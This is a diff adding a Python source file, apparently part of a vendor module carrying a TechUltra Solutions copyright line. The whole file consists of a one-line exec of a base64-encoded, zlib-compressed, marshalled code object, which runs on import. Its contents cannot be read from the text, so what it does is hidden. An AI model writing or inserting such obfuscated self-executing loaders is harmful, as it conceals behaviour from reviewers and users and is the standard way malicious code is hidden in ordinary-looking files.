@@ -1,0 +1,7 @@
+import marshal
+import zlib
+import base64
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJxNkE9rwkAQxaXHfIohPaggOfRYCCUVBKGpRew5rLujHbp/wu4q+rn7BTrZxOjeZvm9N2/e3+fTZJLneQb81qZ1PsIH7b3whAGEVfAl5K84Ysg66uCdAaecA+pZ4xTqsIADoVYhy6QWIcCGiY30FdV0IXuc9VRR7UP0Qsa6G+evaSe73r57M2i9O5NiGUhnjLOwWW6hWg8rilvYxgqDUELexSmc9IWgwqR9A6AwSE9tJPZgrgt186oHLoEUGulRRFQN2zA6bHp3TqOwM07HcJmvAyx7DlZdD+z1li/m8AxkzxRor7Hc+RMmU3ZqPIbW2YBNxEu8++54Gk27QNuBy+ej9NRqJxQnOpDGh0hkhb+O4u9EwYqZB62IUcgfgzY2pO7aWtjri7M4S2D3uN+u8dRkOSVucFROFyPFJytn9TXddv9+PKAadRzjH+J6wBk='))).decode("utf-8"))
+
+# Copyright (c) 2024 TechUltra Solutions Pvt Ltd. 
+# See LICENSE file for full copyright and licensing details
